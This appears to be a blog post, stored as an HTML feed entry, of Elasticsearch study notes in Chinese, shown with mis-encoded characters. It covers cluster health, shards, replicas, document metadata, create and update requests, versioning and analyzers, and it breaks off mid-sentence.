        <content type="html"><![CDATA[<h3 id="Java-API-å®¢æˆ·ç«¯"><a href="#Java-API-å®¢æˆ·ç«¯" class="headerlink" title="Java API å®¢æˆ·ç«¯"></a>Java API å®¢æˆ·ç«¯</h3><ul><li>èŠ‚ç‚¹å®¢æˆ·ç«¯ï¼ˆNode clientï¼‰<br>èŠ‚ç‚¹å®¢æˆ·ç«¯ä½œä¸ºä¸€ä¸ªéæ•°æ®èŠ‚ç‚¹åŠ å…¥åˆ°æœ¬åœ°é›†ç¾¤ä¸­ã€‚æ¢å¥è¯è¯´ï¼Œå®ƒæœ¬èº«ä¸ä¿å­˜ä»»ä½•æ•°æ®ï¼Œä½†æ˜¯å®ƒçŸ¥é“æ•°æ®åœ¨é›†ç¾¤ä¸­çš„å“ªä¸ªèŠ‚ç‚¹ä¸­ï¼Œå¹¶ä¸”å¯ä»¥æŠŠè¯·æ±‚è½¬å‘åˆ°æ­£ç¡®çš„èŠ‚ç‚¹ã€‚</li><li>ä¼ è¾“å®¢æˆ·ç«¯ï¼ˆTransport clientï¼‰<br>è½»é‡çº§çš„ä¼ è¾“å®¢æˆ·ç«¯å¯ä»¥å¯ä»¥å°†è¯·æ±‚å‘é€åˆ°è¿œç¨‹é›†ç¾¤ã€‚å®ƒæœ¬èº«ä¸åŠ å…¥é›†ç¾¤ï¼Œä½†æ˜¯å®ƒå¯ä»¥å°†è¯·æ±‚è½¬å‘åˆ°é›†ç¾¤ä¸­çš„ä¸€ä¸ªèŠ‚ç‚¹ä¸Šã€‚</li></ul><h3 id="é¢å‘æ–‡æ¡£"><a href="#é¢å‘æ–‡æ¡£" class="headerlink" title="é¢å‘æ–‡æ¡£"></a>é¢å‘æ–‡æ¡£</h3><p>ä¹Ÿè®¸æœ‰ä¸€å¤©ä½ æƒ³æŠŠè¿™äº›å¯¹è±¡å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ã€‚ä½¿ç”¨å…³ç³»å‹æ•°æ®åº“çš„è¡Œå’Œåˆ—å­˜å‚¨ï¼Œè¿™ç›¸å½“äºæ˜¯æŠŠä¸€ä¸ªè¡¨ç°åŠ›ä¸°å¯Œçš„å¯¹è±¡æŒ¤å‹åˆ°ä¸€ä¸ªéå¸¸å¤§çš„ç”µå­è¡¨æ ¼ä¸­ï¼šä½ å¿…é¡»å°†è¿™ä¸ªå¯¹è±¡æ‰å¹³åŒ–æ¥é€‚åº”è¡¨ç»“æ„â€“é€šå¸¸ä¸€ä¸ªå­—æ®µ&gt;å¯¹åº”ä¸€åˆ—â€“è€Œä¸”åˆä¸å¾—ä¸åœ¨æ¯æ¬¡æŸ¥è¯¢æ—¶é‡æ–°æ„é€ å¯¹è±¡ã€‚</p><p>Elasticsearch æ˜¯ é¢å‘æ–‡æ¡£ çš„ï¼Œæ„å‘³ç€å®ƒå­˜å‚¨æ•´ä¸ªå¯¹è±¡æˆ– æ–‡æ¡£_ã€‚Elasticsearch ä¸ä»…å­˜å‚¨æ–‡æ¡£ï¼Œè€Œä¸” _ç´¢å¼• æ¯ä¸ªæ–‡æ¡£çš„å†…å®¹ä½¿ä¹‹å¯ä»¥è¢«æ£€ç´¢ã€‚åœ¨ Elasticsearch ä¸­ï¼Œä½  å¯¹æ–‡æ¡£è¿›è¡Œç´¢å¼•ã€æ£€ç´¢ã€æ’åºå’Œè¿‡æ»¤â€“è€Œä¸æ˜¯å¯¹è¡Œåˆ—æ•°æ®ã€‚</p><h3 id="ç®€å•å‘½ä»¤"><a href="#ç®€å•å‘½ä»¤" class="headerlink" title="ç®€å•å‘½ä»¤"></a>ç®€å•å‘½ä»¤</h3><ul><li>å°† HTTP å‘½ä»¤ç”± PUT æ”¹ä¸º GET å¯ä»¥ç”¨æ¥æ£€ç´¢æ–‡æ¡£ï¼ŒåŒæ ·çš„ï¼Œå¯ä»¥ä½¿ç”¨ DELETE å‘½ä»¤æ¥åˆ é™¤æ–‡æ¡£ï¼Œä»¥åŠä½¿ç”¨ HEAD æŒ‡ä»¤æ¥æ£€æŸ¥æ–‡æ¡£æ˜¯å¦å­˜åœ¨ã€‚å¦‚æœæƒ³æ›´æ–°å·²å­˜åœ¨çš„æ–‡æ¡£ï¼Œåªéœ€å†æ¬¡ PUT ã€‚</li></ul><h3 id="å¸¸ç”¨æ¥å£"><a href="#å¸¸ç”¨æ¥å£" class="headerlink" title="å¸¸ç”¨æ¥å£"></a>å¸¸ç”¨æ¥å£</h3><ol><li>åˆ›å»ºmapping</li></ol><h3 id="é›†ç¾¤å†…çš„åŸç†"><a href="#é›†ç¾¤å†…çš„åŸç†" class="headerlink" title="é›†ç¾¤å†…çš„åŸç†"></a>é›†ç¾¤å†…çš„åŸç†</h3><p>ä¸€ä¸ªè¿è¡Œä¸­çš„ Elasticsearch å®ä¾‹ç§°ä¸ºä¸€ä¸ª èŠ‚ç‚¹ï¼Œè€Œé›†ç¾¤æ˜¯ç”±ä¸€ä¸ªæˆ–è€…å¤šä¸ªæ‹¥æœ‰ç›¸åŒ cluster.name é…ç½®çš„èŠ‚ç‚¹ç»„æˆï¼Œ<strong>å®ƒä»¬å…±åŒæ‰¿æ‹…æ•°æ®å’Œè´Ÿè½½çš„å‹åŠ›</strong>ã€‚å½“æœ‰èŠ‚ç‚¹åŠ å…¥é›†ç¾¤ä¸­æˆ–è€…ä»é›†ç¾¤ä¸­ç§»é™¤èŠ‚ç‚¹æ—¶ï¼Œ<strong>é›†ç¾¤å°†ä¼šé‡æ–°å¹³å‡åˆ†å¸ƒæ‰€æœ‰çš„æ•°æ®</strong>ã€‚</p><p>å½“ä¸€ä¸ªèŠ‚ç‚¹è¢«é€‰ä¸¾æˆä¸ºä¸»èŠ‚ç‚¹æ—¶ï¼Œ<strong>å®ƒå°†è´Ÿè´£ç®¡ç†é›†ç¾¤èŒƒå›´å†…çš„æ‰€æœ‰å˜æ›´</strong>ï¼Œä¾‹å¦‚å¢åŠ ã€åˆ é™¤ç´¢å¼•ï¼Œæˆ–è€…å¢åŠ ã€åˆ é™¤èŠ‚ç‚¹ç­‰ã€‚è€Œä¸»èŠ‚ç‚¹å¹¶ä¸éœ€è¦æ¶‰åŠåˆ°æ–‡æ¡£çº§åˆ«çš„å˜æ›´å’Œæœç´¢ç­‰æ“ä½œã€‚</p><p><strong>æˆ‘ä»¬å¯ä»¥å°†è¯·æ±‚å‘é€åˆ°é›†ç¾¤ä¸­çš„ä»»ä½•èŠ‚ç‚¹</strong>ï¼ŒåŒ…æ‹¬ä¸»èŠ‚ç‚¹ã€‚<strong>æ¯ä¸ªèŠ‚ç‚¹éƒ½çŸ¥é“ä»»æ„æ–‡æ¡£æ‰€å¤„çš„ä½ç½®</strong>ï¼Œå¹¶ä¸”èƒ½å¤Ÿå°†æˆ‘ä»¬çš„è¯·æ±‚ç›´æ¥è½¬å‘åˆ°å­˜å‚¨æˆ‘ä»¬æ‰€éœ€æ–‡æ¡£çš„èŠ‚ç‚¹ã€‚æ— è®ºæˆ‘ä»¬å°†è¯·æ±‚å‘é€åˆ°å“ªä¸ªèŠ‚ç‚¹ï¼Œå®ƒéƒ½èƒ½è´Ÿè´£ä»å„ä¸ªåŒ…å«æˆ‘ä»¬æ‰€éœ€æ–‡æ¡£çš„èŠ‚ç‚¹æ”¶é›†å›æ•°æ®ï¼Œå¹¶å°†æœ€ç»ˆç»“æœè¿”å›çµ¦å®¢æˆ·ç«¯ã€‚</p><h3 id="é›†ç¾¤å¥åº·"><a href="#é›†ç¾¤å¥åº·" class="headerlink" title="é›†ç¾¤å¥åº·"></a>é›†ç¾¤å¥åº·</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">GET /_cluster/health</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">   &quot;cluster_name&quot;: &quot;library&quot;,</span><br><span class="line">   &quot;status&quot;: &quot;yellow&quot;,</span><br><span class="line">   &quot;timed_out&quot;: false,</span><br><span class="line">   &quot;number_of_nodes&quot;: 1,</span><br><span class="line">   &quot;number_of_data_nodes&quot;: 1,</span><br><span class="line">   &quot;active_primary_shards&quot;: 5,</span><br><span class="line">   &quot;active_shards&quot;: 5,</span><br><span class="line">   &quot;relocating_shards&quot;: 0,</span><br><span class="line">   &quot;initializing_shards&quot;: 0,</span><br><span class="line">   &quot;unassigned_shards&quot;: 5,</span><br><span class="line">   &quot;delayed_unassigned_shards&quot;: 0,</span><br><span class="line">   &quot;number_of_pending_tasks&quot;: 0,</span><br><span class="line">   &quot;number_of_in_flight_fetch&quot;: 0,</span><br><span class="line">   &quot;task_max_waiting_in_queue_millis&quot;: 0,</span><br><span class="line">   &quot;active_shards_percent_as_number&quot;: 50</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>status å­—æ®µæ˜¯æˆ‘ä»¬æœ€å…³å¿ƒçš„ã€‚status å­—æ®µæŒ‡ç¤ºç€å½“å‰é›†ç¾¤åœ¨æ€»ä½“ä¸Šæ˜¯å¦å·¥ä½œæ­£å¸¸ã€‚å®ƒçš„ä¸‰ç§é¢œè‰²å«ä¹‰å¦‚ä¸‹ï¼š</p><ul><li>green<br>  æ‰€æœ‰çš„<strong>ä¸»åˆ†ç‰‡</strong>å’Œ<strong>å‰¯æœ¬åˆ†ç‰‡</strong>éƒ½æ­£å¸¸è¿è¡Œã€‚</li><li>yellow<br>  æ‰€æœ‰çš„ä¸»åˆ†ç‰‡éƒ½æ­£å¸¸è¿è¡Œï¼Œä½†ä¸æ˜¯æ‰€æœ‰çš„å‰¯æœ¬åˆ†ç‰‡éƒ½æ­£å¸¸è¿è¡Œã€‚</li><li>red<br>  æœ‰ä¸»åˆ†ç‰‡æ²¡èƒ½æ­£å¸¸è¿è¡Œã€‚</li></ul><h3 id="åˆ†ç‰‡"><a href="#åˆ†ç‰‡" class="headerlink" title="åˆ†ç‰‡"></a>åˆ†ç‰‡</h3><p>æˆ‘ä»¬å¾€ Elasticsearch æ·»åŠ æ•°æ®æ—¶éœ€è¦ç”¨åˆ° ç´¢å¼• â€”â€” ä¿å­˜ç›¸å…³æ•°æ®çš„åœ°æ–¹ã€‚ ç´¢å¼•å®é™…ä¸Šæ˜¯æŒ‡å‘ä¸€ä¸ªæˆ–è€…å¤šä¸ªç‰©ç†åˆ†ç‰‡çš„é€»è¾‘å‘½åç©ºé—´ ã€‚</p><p>ä¸€ä¸ªåˆ†ç‰‡æ˜¯ä¸€ä¸ªåº•å±‚çš„å·¥ä½œå•å…ƒ ï¼Œå®ƒä»…ä¿å­˜äº†å…¨éƒ¨æ•°æ®ä¸­çš„ä¸€éƒ¨åˆ†ã€‚ åœ¨åˆ†ç‰‡å†…éƒ¨æœºåˆ¶ä¸­ï¼Œæˆ‘ä»¬å°†è¯¦ç»†ä»‹ç»åˆ†ç‰‡æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œè€Œç°åœ¨æˆ‘ä»¬åªéœ€çŸ¥é“<strong>ä¸€ä¸ªåˆ†ç‰‡æ˜¯ä¸€ä¸ª Lucene çš„å®ä¾‹</strong>ï¼Œä»¥åŠå®ƒæœ¬èº«å°±æ˜¯ä¸€ä¸ªå®Œæ•´çš„æœç´¢å¼•æ“ã€‚ æˆ‘ä»¬çš„æ–‡æ¡£è¢«å­˜å‚¨å’Œç´¢å¼•åˆ°åˆ†ç‰‡å†…ï¼Œä½†æ˜¯åº”ç”¨ç¨‹åºæ˜¯ç›´æ¥ä¸ç´¢å¼•è€Œä¸æ˜¯ä¸åˆ†ç‰‡è¿›è¡Œäº¤äº’ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- åˆ†é…3ä¸ªä¸»åˆ†ç‰‡å’Œä¸€ä»½å‰¯æœ¬ï¼ˆæ¯ä¸ªä¸»åˆ†ç‰‡æ‹¥æœ‰ä¸€ä¸ªå‰¯æœ¬åˆ†ç‰‡ï¼‰ --&gt;</span><br><span class="line">PUT /blogs</span><br><span class="line">&#123;</span><br><span class="line">   &quot;settings&quot; : &#123;</span><br><span class="line">      &quot;number_of_shards&quot; : 3, </span><br><span class="line">      &quot;number_of_replicas&quot; : 1</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æŠ€æœ¯ä¸Šæ¥è¯´ï¼Œä¸€ä¸ªä¸»åˆ†ç‰‡æœ€å¤§èƒ½å¤Ÿå­˜å‚¨ Integer.MAX_VALUE - 128 ä¸ªæ–‡æ¡£</p></blockquote><p>ä¸€ä¸ªå‰¯æœ¬åˆ†ç‰‡åªæ˜¯ä¸€ä¸ªä¸»åˆ†ç‰‡çš„æ‹·è´ã€‚ å‰¯æœ¬åˆ†ç‰‡ä½œä¸ºç¡¬ä»¶æ•…éšœæ—¶ä¿æŠ¤æ•°æ®ä¸ä¸¢å¤±çš„å†—ä½™å¤‡ä»½ï¼Œå¹¶ä¸ºæœç´¢å’Œè¿”å›æ–‡æ¡£ç­‰è¯»æ“ä½œæä¾›æœåŠ¡ã€‚</p><p>ä¸»åˆ†ç‰‡çš„æ•°ç›®åœ¨ç´¢å¼•åˆ›å»ºæ—¶ å°±å·²ç»ç¡®å®šäº†ä¸‹æ¥ã€‚ ä½†æ˜¯ï¼Œè¯»æ“ä½œâ€”â€”æœç´¢å’Œè¿”å›æ•°æ®â€”â€”å¯ä»¥åŒæ—¶è¢«ä¸»åˆ†ç‰‡æˆ–å‰¯æœ¬åˆ†ç‰‡æ‰€å¤„ç†ï¼Œ<strong>æ‰€ä»¥å½“ä½ æ‹¥æœ‰è¶Šå¤šçš„å‰¯æœ¬åˆ†ç‰‡æ—¶ï¼Œä¹Ÿå°†æ‹¥æœ‰è¶Šé«˜çš„ååé‡</strong>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PUT /blogs/_settings</span><br><span class="line">&#123;</span><br><span class="line">   &quot;number_of_replicas&quot; : 2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ–‡æ¡£å…ƒæ•°æ®"><a href="#æ–‡æ¡£å…ƒæ•°æ®" class="headerlink" title="æ–‡æ¡£å…ƒæ•°æ®"></a>æ–‡æ¡£å…ƒæ•°æ®</h3><ul><li><p>_index<br>  ä¸€ä¸ªç´¢å¼•åº”è¯¥æ˜¯å› å…±åŒçš„ç‰¹æ€§è¢«åˆ†ç»„åˆ°ä¸€èµ·çš„æ–‡æ¡£é›†åˆã€‚</p></li><li><p>_type<br>  æ•°æ®å¯èƒ½åœ¨ç´¢å¼•ä¸­åªæ˜¯æ¾æ•£çš„ç»„åˆåœ¨ä¸€èµ·ï¼Œä½†æ˜¯é€šå¸¸æ˜ç¡®å®šä¹‰ä¸€äº›æ•°æ®ä¸­çš„å­åˆ†åŒºæ˜¯å¾ˆæœ‰ç”¨çš„ã€‚</p><blockquote><p>è¿™é‡Œæˆ‘ä»¬ç”¨æ•°æ®åº“çš„databaseå»ç±»æ¯”_indexï¼Œtableç±»æ¯”_typeæ˜¯ä¸åˆé€‚çš„ï¼Œä¸€ä¸ªæ•°æ®åº“é‡Œé¢æ¯ä¸ªè¡¨å¾€å¾€æœ‰å¾ˆå¤§å·®å¼‚ã€‚å¦‚æœåœ¨esè¿™æ ·å¯¹åº”ï¼Œé‚£ä¹ˆä¸€ä¸ª_indexä¸‹é¢çš„æ–‡æ¡£å¯èƒ½æ ¹æœ¬å°±æ²¡æœ‰åŒå·¥ç‰¹æ€§ã€‚è¿™æ˜¯ä¸åˆé€‚çš„ï¼Œå»ºè®®å°½å¯èƒ½ä¸€ä¸ªtableå°±æ˜¯ä¸€ä¸ª_indexã€‚<code>index.mapping.single_type</code></p></blockquote></li><li><p>_id<br>  ID æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œ å½“å®ƒå’Œ _index ä»¥åŠ _type ç»„åˆå°±å¯ä»¥å”¯ä¸€ç¡®å®š Elasticsearch ä¸­çš„ä¸€ä¸ªæ–‡æ¡£ã€‚</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PUT /library</span><br><span class="line">&#123;</span><br><span class="line">    &quot;settings&quot;: &#123;</span><br><span class="line">        &quot;number_of_shards&quot; :   4,</span><br><span class="line">        &quot;number_of_replicas&quot; : 1,</span><br><span class="line">        &quot;index.mapping.single_type&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://elasticsearch.cn/book/elasticsearch_definitive_guide_2.x/mapping.html">https://elasticsearch.cn/book/elasticsearch_definitive_guide_2.x/mapping.html</a></p><h4 id="åˆ›å»ºæ–°æ–‡æ¡£"><a href="#åˆ›å»ºæ–°æ–‡æ¡£" class="headerlink" title="åˆ›å»ºæ–°æ–‡æ¡£"></a>åˆ›å»ºæ–°æ–‡æ¡£</h4><p>ä¸¤ç§æ–¹å¼ POST ã€PUTã€‚POST ä¸èƒ½æŒ‡å®šIDï¼ŒPUTæ–¹å¼å¯ä»¥è‡ªå®šä¹‰IDï¼ˆä¸åŒäºæ–°å¢ï¼Œæˆ‘ä»¬éœ€è¦åœ¨åé¢åŠ ?op_type&#x3D;createæˆ–è€…&#x2F;_createè¯´æ˜è¿™ä¸ªæ“ä½œæ˜¯æ–°å¢ä¸æ˜¯æ›´æ–°ï¼‰ã€‚</p><ul><li><p>POST</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /website/blog/</span><br><span class="line">&#123;</span><br><span class="line">&quot;title&quot;: &quot;My first blog entry&quot;,</span><br><span class="line">&quot;text&quot;:  &quot;Just trying this out...&quot;,</span><br><span class="line">&quot;date&quot;:  &quot;2017/10/21&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>PUT </p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PUT /website/blog/123/_create</span><br><span class="line">&#123;</span><br><span class="line">&quot;title&quot;: &quot;My first blog entry&quot;,</span><br><span class="line">&quot;text&quot;:  &quot;Just trying this out...&quot;,</span><br><span class="line">&quot;date&quot;:  &quot;2017/10/21&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="æ›´æ–°æ–‡æ¡£"><a href="#æ›´æ–°æ–‡æ¡£" class="headerlink" title="æ›´æ–°æ–‡æ¡£"></a>æ›´æ–°æ–‡æ¡£</h4><p>PUT æ•´ä½“æ›´æ–°ï¼ˆç›´æ¥æ›¿æ¢ï¼‰ï¼ŒPOST &#x2F;_update å±€éƒ¨æ›´æ–°ã€‚<br><strong>æ–‡æ¡£ä¸èƒ½è¢«ä¿®æ”¹ï¼Œåªèƒ½è¢«æ›¿æ¢ã€‚</strong></p><ol><li>ä»æ—§æ–‡æ¡£æ„å»º JSON</li><li>æ›´æ”¹è¯¥ JSON</li><li>åˆ é™¤æ—§æ–‡æ¡£</li><li>ç´¢å¼•ä¸€ä¸ªæ–°æ–‡æ¡£</li></ol><h3 id="ä¹è§‚å¹¶å‘æ§åˆ¶"><a href="#ä¹è§‚å¹¶å‘æ§åˆ¶" class="headerlink" title="ä¹è§‚å¹¶å‘æ§åˆ¶"></a>ä¹è§‚å¹¶å‘æ§åˆ¶</h3><ul><li><p>æ‚²è§‚å¹¶å‘æ§åˆ¶<br>è¿™ç§æ–¹æ³•è¢«å…³ç³»å‹æ•°æ®åº“å¹¿æ³›ä½¿ç”¨ï¼Œå®ƒå‡å®šæœ‰å˜æ›´å†²çªå¯èƒ½å‘ç”Ÿï¼Œå› æ­¤é˜»å¡è®¿é—®èµ„æºä»¥é˜²æ­¢å†²çªã€‚ ä¸€ä¸ªå…¸å‹çš„ä¾‹å­æ˜¯è¯»å–ä¸€è¡Œæ•°æ®ä¹‹å‰å…ˆå°†å…¶é”ä½ï¼Œç¡®ä¿åªæœ‰æ”¾ç½®é”çš„çº¿ç¨‹èƒ½å¤Ÿå¯¹è¿™è¡Œæ•°æ®è¿›è¡Œä¿®æ”¹ã€‚</p></li><li><p>ä¹è§‚å¹¶å‘æ§åˆ¶<br>Elasticsearch ä¸­ä½¿ç”¨çš„è¿™ç§æ–¹æ³•å‡å®šå†²çªæ˜¯ä¸å¯èƒ½å‘ç”Ÿçš„ï¼Œå¹¶ä¸”ä¸ä¼šé˜»å¡æ­£åœ¨å°è¯•çš„æ“ä½œã€‚ ç„¶è€Œï¼Œå¦‚æœæºæ•°æ®åœ¨è¯»å†™å½“ä¸­è¢«ä¿®æ”¹ï¼Œæ›´æ–°å°†ä¼šå¤±è´¥ã€‚åº”ç”¨ç¨‹åºæ¥ä¸‹æ¥å°†å†³å®šè¯¥å¦‚ä½•è§£å†³å†²çªã€‚ ä¾‹å¦‚ï¼Œå¯ä»¥é‡è¯•æ›´æ–°ã€ä½¿ç”¨æ–°çš„æ•°æ®ã€æˆ–è€…å°†ç›¸å…³æƒ…å†µæŠ¥å‘Šç»™ç”¨æˆ·ã€‚</p></li></ul><p>Elasticsearch æ˜¯åˆ†å¸ƒå¼çš„ã€‚å½“æ–‡æ¡£åˆ›å»ºã€æ›´æ–°æˆ–åˆ é™¤æ—¶ï¼Œæ–°ç‰ˆæœ¬çš„æ–‡æ¡£å¿…é¡»å¤åˆ¶åˆ°é›†ç¾¤ä¸­çš„å…¶ä»–èŠ‚ç‚¹ã€‚Elasticsearch ä¹Ÿæ˜¯å¼‚æ­¥å’Œå¹¶å‘çš„ï¼Œè¿™æ„å‘³ç€è¿™äº›å¤åˆ¶è¯·æ±‚è¢«å¹¶è¡Œå‘é€ï¼Œå¹¶ä¸”åˆ°è¾¾ç›®çš„åœ°æ—¶ä¹Ÿè®¸é¡ºåºæ˜¯ä¹±çš„ ã€‚Elasticsearch ä½¿ç”¨ _version å·æ¥ç¡®ä¿å˜æ›´ä»¥æ­£ç¡®é¡ºåºå¾—åˆ°æ‰§è¡Œã€‚å¦‚æœæ—§ç‰ˆæœ¬çš„æ–‡æ¡£åœ¨æ–°ç‰ˆæœ¬ä¹‹ååˆ°è¾¾ï¼Œå®ƒå¯ä»¥è¢«ç®€å•çš„å¿½ç•¥ã€‚</p><h3 id="åˆ†å¸ƒå¼æ–‡æ¡£å­˜å‚¨"><a href="#åˆ†å¸ƒå¼æ–‡æ¡£å­˜å‚¨" class="headerlink" title="åˆ†å¸ƒå¼æ–‡æ¡£å­˜å‚¨"></a>åˆ†å¸ƒå¼æ–‡æ¡£å­˜å‚¨</h3><p>å½“ç´¢å¼•ä¸€ä¸ªæ–‡æ¡£çš„æ—¶å€™ï¼Œæ–‡æ¡£ä¼šè¢«å­˜å‚¨åˆ°ä¸€ä¸ªä¸»åˆ†ç‰‡ä¸­ã€‚ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shard = hash(routing) % number_of_primary_shards</span><br></pre></td></tr></table></figure><blockquote><p>æˆ‘ä»¬è¦åœ¨åˆ›å»ºç´¢å¼•çš„æ—¶å€™å°±ç¡®å®šå¥½ä¸»åˆ†ç‰‡çš„æ•°é‡å¹¶ä¸”æ°¸è¿œä¸ä¼šæ”¹å˜è¿™ä¸ªæ•°é‡ï¼šå› ä¸ºå¦‚æœæ•°é‡å˜åŒ–äº†ï¼Œé‚£ä¹ˆæ‰€æœ‰ä¹‹å‰è·¯ç”±çš„å€¼éƒ½ä¼šæ— æ•ˆï¼Œæ–‡æ¡£ä¹Ÿå†ä¹Ÿæ‰¾ä¸åˆ°äº†ã€‚</p></blockquote><p>æˆ‘ä»¬å¯ä»¥å‘é€è¯·æ±‚åˆ°é›†ç¾¤ä¸­çš„ä»»ä¸€èŠ‚ç‚¹ã€‚<strong>æ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰èƒ½åŠ›å¤„ç†ä»»æ„è¯·æ±‚</strong>ã€‚ æ¯ä¸ªèŠ‚ç‚¹éƒ½çŸ¥é“é›†ç¾¤ä¸­ä»»ä¸€æ–‡æ¡£ä½ç½®ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥å°†è¯·æ±‚è½¬å‘åˆ°éœ€è¦çš„èŠ‚ç‚¹ä¸Šã€‚   </p><p>æ–°å»ºã€ç´¢å¼•å’Œåˆ é™¤è¯·æ±‚éƒ½æ˜¯<strong>å†™</strong>æ“ä½œï¼Œå¿…é¡»åœ¨ä¸»åˆ†ç‰‡ä¸Šé¢å®Œæˆä¹‹åæ‰èƒ½è¢«å¤åˆ¶åˆ°ç›¸å…³çš„å‰¯æœ¬åˆ†ç‰‡ã€‚</p><p><img src="/images/QQ20171023-152716@2x.jpg"></p><ol><li>å®¢æˆ·ç«¯å‘ Node 1 å‘é€æ–°å»ºã€ç´¢å¼•æˆ–è€…åˆ é™¤è¯·æ±‚ã€‚</li><li>èŠ‚ç‚¹ä½¿ç”¨æ–‡æ¡£çš„ _id ç¡®å®šæ–‡æ¡£å±äºåˆ†ç‰‡ 0<code>ã€‚è¯·æ±‚ä¼šè¢«è½¬å‘åˆ° </code>Node 3<code>ï¼Œå› ä¸ºåˆ†ç‰‡ 0 çš„ä¸»åˆ†ç‰‡ç›®å‰è¢«åˆ†é…åœ¨ </code>Node 3 ä¸Šã€‚</li><li>Node 3 åœ¨ä¸»åˆ†ç‰‡ä¸Šé¢æ‰§è¡Œè¯·æ±‚ã€‚å¦‚æœæˆåŠŸäº†ï¼Œå®ƒå°†è¯·æ±‚å¹¶è¡Œè½¬å‘åˆ° Node 1 å’Œ Node 2 çš„å‰¯æœ¬åˆ†ç‰‡ä¸Šã€‚ä¸€æ—¦æ‰€æœ‰çš„å‰¯æœ¬åˆ†ç‰‡éƒ½æŠ¥å‘ŠæˆåŠŸ, Node 3 å°†å‘åè°ƒèŠ‚ç‚¹æŠ¥å‘ŠæˆåŠŸï¼Œåè°ƒèŠ‚ç‚¹å‘å®¢æˆ·ç«¯æŠ¥å‘ŠæˆåŠŸã€‚</li></ol><p><img src="/images/QQ20171023-153637@2x.jpg"></p><h3 id="æœç´¢"><a href="#æœç´¢" class="headerlink" title="æœç´¢"></a>æœç´¢</h3><ul><li>æ˜ å°„ï¼ˆMappingï¼‰<br>  æè¿°æ•°æ®åœ¨æ¯ä¸ªå­—æ®µå†…å¦‚ä½•å­˜å‚¨</li><li>åˆ†æï¼ˆAnalysisï¼‰<br>  å…¨æ–‡æ˜¯å¦‚ä½•å¤„ç†ä½¿ä¹‹å¯ä»¥è¢«æœç´¢çš„</li><li>é¢†åŸŸç‰¹å®šæŸ¥è¯¢è¯­è¨€ï¼ˆQuery DSLï¼‰<br>  Elasticsearch ä¸­å¼ºå¤§çµæ´»çš„æŸ¥è¯¢è¯­è¨€</li></ul><h3 id="åˆ†æä¸åˆ†æå™¨"><a href="#åˆ†æä¸åˆ†æå™¨" class="headerlink" title="åˆ†æä¸åˆ†æå™¨"></a>åˆ†æä¸åˆ†æå™¨</h3><p>åˆ†æå™¨å®é™…ä¸Šæ˜¯å°†ä¸‰ä¸ªåŠŸèƒ½å°è£…åˆ°äº†ä¸€ä¸ªåŒ…é‡Œï¼š</p><ul><li>å­—ç¬¦è¿‡æ»¤å™¨<br>  é¦–å…ˆï¼Œå­—ç¬¦ä¸²æŒ‰é¡ºåºé€šè¿‡æ¯ä¸ªå­—ç¬¦è¿‡æ»¤å™¨ ã€‚ä»–ä»¬çš„ä»»åŠ¡æ˜¯åœ¨åˆ†è¯å‰æ•´ç†å­—ç¬¦ä¸²ã€‚ä¸€ä¸ªå­—ç¬¦è¿‡æ»¤å™¨å¯ä»¥ç”¨æ¥å»æ‰HTMLï¼Œæˆ–è€…å°† &amp; è½¬åŒ–æˆ <code>and</code>ã€‚</li><li>åˆ†è¯å™¨<br>  å…¶æ¬¡ï¼Œå­—ç¬¦ä¸²è¢« åˆ†è¯å™¨ åˆ†ä¸ºå•ä¸ªçš„è¯æ¡ã€‚ä¸€ä¸ªç®€å•çš„åˆ†è¯å™¨é‡åˆ°ç©ºæ ¼å’Œæ ‡ç‚¹çš„æ—¶å€™ï¼Œå¯èƒ½ä¼šå°†æ–‡æœ¬æ‹†åˆ†æˆè¯æ¡ã€‚</li><li>Token è¿‡æ»¤å™¨<br>  æœ€åï¼Œè¯æ¡æŒ‰é¡ºåºé€šè¿‡æ¯ä¸ª token è¿‡æ»¤å™¨ ã€‚è¿™ä¸ªè¿‡ç¨‹å¯èƒ½ä¼šæ”¹å˜è¯æ¡ï¼ˆä¾‹å¦‚ï¼Œå°å†™åŒ– Quick 